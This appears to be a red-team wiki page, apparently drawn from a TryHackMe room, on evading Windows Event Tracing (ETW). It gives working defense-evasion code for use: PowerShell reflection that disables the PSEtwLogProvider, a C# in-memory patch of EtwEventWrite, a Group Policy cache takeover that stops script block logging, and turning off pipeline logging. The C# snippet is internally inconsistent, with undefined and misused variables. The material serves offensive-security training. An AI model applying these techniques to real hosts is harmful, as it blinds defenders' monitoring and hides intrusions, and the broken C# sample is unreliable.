# ETW evasion

## Theory

[Event Tracing for Windows (ETW)](https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-) provides a mechanism to trace and log events that are raised by user-mode applications and kernel-mode drivers.

### ETW Direct Attacks - Opsec considerations

{% hint style="danger" %}
Directly deleting ETW logs can be an OPSEC (Operational Security) risk.
{% endhint %}

Assuming an attacker did destroy all of the logs before they were forwarded to a SIEM by the SOC, or if they were not forwarded, how would this raise an alert? An attacker must first consider environment integrity; if no logs originate from a device, that can present serious suspicion and lead to an investigation. Even if an attacker did control what logs were removed and forwarded, defenders could still track the tampering.

| EventID  | Description                                           |
| -------- | ----------------------------------------------------- |
| **1102** | Logs when the Windows Security audit log was cleared  |
| **104**  | Logs when the log file was cleared                    |
| **1100** | Logs when the Windows Event Log service was shut down |

## ETW Components

ETW is broken up into three separate components, working together to manage and correlate data. Event logs in Windows are no different from generic XML data, making it easy to process and interpret.

**Event Controllers** are used to build and configure sessions. To expand on this definition, we can think of the controller as the application that determines how and where data will flow. From the [Microsoft docs](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#controllers), “Controllers are applications that define the size and location of the log file, start and stop event tracing sessions, enable providers so they can log events to the session, manage the size of the buffer pool, and obtain execution statistics for sessions.”

**Event Providers** are used to generate events. To expand on this definition, the controller will tell the provider how to operate, then collect logs from its designated source. From the [Microsoft docs](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#providers), “Providers are applications that contain event tracing instrumentation. After a provider registers itself, a controller can then enable or disable event tracing in the provider. The provider defines its interpretation of being enabled or disabled. Generally, an enabled provider generates events, while a disabled provider does not.”

**Event Consumers** are used to interpret events. To expand on this definition, the consumer will select sessions and parse events from that session or multiple at the same time. This is most commonly seen in the “_Event Viewer”._ From the [Microsoft docs](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#consumers), “Consumers are applications that select one or more event tracing sessions as a source of events. A consumer can request events from multiple event tracing sessions simultaneously; the system delivers the events in chronological order. Consumers can receive events stored in log files, or from sessions that deliver events in real time.”

<figure><img src="../../.gitbook/assets/dc8217f5aecbcc08d609c3299756da08.png" alt=""><figcaption></figcaption></figure>

Now that we understand how ETW is instrumented, how does this apply to attackers? We previously mentioned the goal of limiting visibility while maintaining integrity. We can limit a specific aspect of insight by targeting components while maintaining most of the data flow. Below is a brief list of specific techniques that target each ETW component.

| Component  | Techniques                                                                              |
| ---------- | --------------------------------------------------------------------------------------- |
| Provider   | PSEtwLogProvider Modification, Group Policy Takeover, Log Pipeline Abuse, Type Creation |
| Controller | Patching EtwEventWrite, Runtime Tracing Tampering,                                      |
| Consumers  | Log Smashing, Log Tampering                                                             |

## Practice

To find where AMSI is instrumented, we can use [InsecurePowerShell](https://github.com/cobbr/InsecurePowerShell) maintained by [Cobbr](https://github.com/cobbr) which is a GitHub fork of PowerShell with security feature removed, and compare it with an [offical PowerShell GitHub](https://github.com/PowerShell/PowerShell).

### PowerShell - PSEtwLogProvider Reflection

Within PowerShell, ETW providers are loaded into the session from a **.NET assembly**: `PSEtwLogProvider`. From the [Microsoft docs](https://docs.microsoft.com/en-us/dotnet/standard/assembly/), "Assemblies form the fundamental units of deployment, version control, reuse, activation scoping, and security permissions for .NET-based applications."

In a PowerShell session, most .NET assemblies are loaded in the same security context as the user at startup. Since the session has the same privilege level as the loaded assemblies, we can modify the assembly fields and values through PowerShell reflection.\
In the context of **ETW** (**E**vent **T**racing for **W**indows), an attacker can reflect the ETW event provider assembly and set the field `m_enabled` to `$null`

{% tabs %}
{% tab title="Powershell" %}
At a high level, PowerShell reflection can be broken up into four steps:

1. Obtain .NET assembly for `PSEtwLogProvider`.
2. Store a null value for `etwProvider` field.
3. Set the field for `m_enabled` to previously stored value.

<pre class="language-bash"><code class="lang-bash"><strong>#obtain the type for the PSEtwLogProvider assembly
</strong><strong>$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
</strong><strong>
</strong><strong>#we are storing a value ($null) from the previous assembly to be used.
</strong><strong>$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
</strong><strong>
</strong><strong>#we compile our steps together to overwrite the m_enabled field with the value stored in the previous line
</strong>[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
</code></pre>
{% endtab %}
{% endtabs %}

### Patching Tracing Functions

ETW is loaded from the runtime of every new process, commonly originating from the **CLR** (**C**ommon **L**anguage **R**untime). Within a new process, ETW events are sent from the userland and issued directly from the current process. An attacker can write pre-defined opcodes to an in-memory function of ETW to patch and disable functionality.

{% tabs %}
{% tab title="C#" %}
At a high level, ETW patching on x64bits systems can be broken up into five steps:

1. Obtain a handle for `EtwEventWrite`
2. Modify memory permissions of the function
3. Write opcode bytes to memory
4. Reset memory permissions of the function (optional)
5. Flush the instruction cache (optional)

<pre class="language-csharp"><code class="lang-csharp">//we need to obtain a handle for the address of EtwEventWrite
var ntdll = Win32.LoadLibrary("ntdll.dll");
var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");

//we need to modify the memory permissions of the function to allow us to write to the function
uint oldProtect;
Win32.VirtualProtect(
	etwFunction, 
	(UIntPtr)patch.Length, 
	0x40, 
	out oldProtect
);

//the function has the permissions we need to write to it, and we have the pre-defined opcode to patch it. 
//Because we are writing to a function and not a process, we can use the infamous Marshal.Copy to write our opcode
<strong>patch(new byte[] { 0xc2, 0x14, 0x00 });
</strong>Marshal.Copy(
	patch, 
	0, 
	etwEventSend, 
	patch.Length
);

//we can begin cleaning our steps to restore memory permissions as they were.
VirtualProtect(etwFunction, 4, oldProtect, &#x26;oldOldProtect);

//we can ensure the patched function will be executed from the instruction cache.
Win32.FlushInstructionCache(
	etwFunction,
	NULL
);

</code></pre>
{% endtab %}
{% endtabs %}

### Powershell - GPO Takeover

ETW has a lot of coverage out of the box, but it will disable some features unless specified because of the amount of logs they can create. These features can be enabled by modifying the **GPO** (**G**roup **P**olicy **O**bject) settings of their parent policy. \
Two of the most popular GPO providers provide coverage over PowerShell, including **script block logging** and **module logging**.

Within a PowerShell session, system assemblies are loaded in the same security context as users. This means an attacker has the same privilege level as the assemblies that cache GPO settings. Using reflection, an attacker can obtain the utility dictionary and modify the group policy for either PowerShell provider.

{% tabs %}
{% tab title="Powershell" %}
At a high-level a group policy takeover can be broken up into three steps:

1. Obtain group policy settings from the utility cache.
2. Modify generic provider to `0`.
3. Modify the invocation or module definition.

```powershell
$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static');
  If ($GroupPolicyField) {
      $GroupPolicyCache = $GroupPolicyField.GetValue($null);
      If ($GroupPolicyCache['ScriptBlockLogging']) {
          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;
          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0;
      }
      $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new();
      $val.Add('EnableScriptBlockLogging', 0);
      $val.Add('EnableScriptBlockInvocationLogging', 0);
      $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = $val
  };
```

{% hint style="info" %}
Will evade EventIDs 4103 & 4104
{% endhint %}
{% endtab %}
{% endtabs %}

### Abusing Log Pipeline

Within PowerShell, each module or snap-in has a setting that anyone can use to modify its logging functionality. From the [Microsoft docs](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_eventlogs?view=powershell-5.1#logging-module-events), “When the _LogPipelineExecutionDetails_ property value is TRUE (`$true`), Windows PowerShell writes cmdlet and function execution events in the session to the Windows PowerShell log in Event Viewer.” An attacker can change this value to `$false` in any PowerShell session to disable a module logging for that specific session. The Microsoft docs even note the ability to disable logging from a user session, “To disable logging, use the same command sequence to set the property value to FALSE (`$false`).”

{% tabs %}
{% tab title="Powershell" %}
At a high-level the log pipeline technique can be broken up into four steps:

1. Obtain the target module.
2. Set module execution details to `$false`.
3. Obtain the module snap-in.
4. Set snap-in execution details to `$false`.

```powershell
$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false
  
```
{% endtab %}
{% endtabs %}



## References

{% embed url="https://tryhackme.com/room/monitoringevasion" %}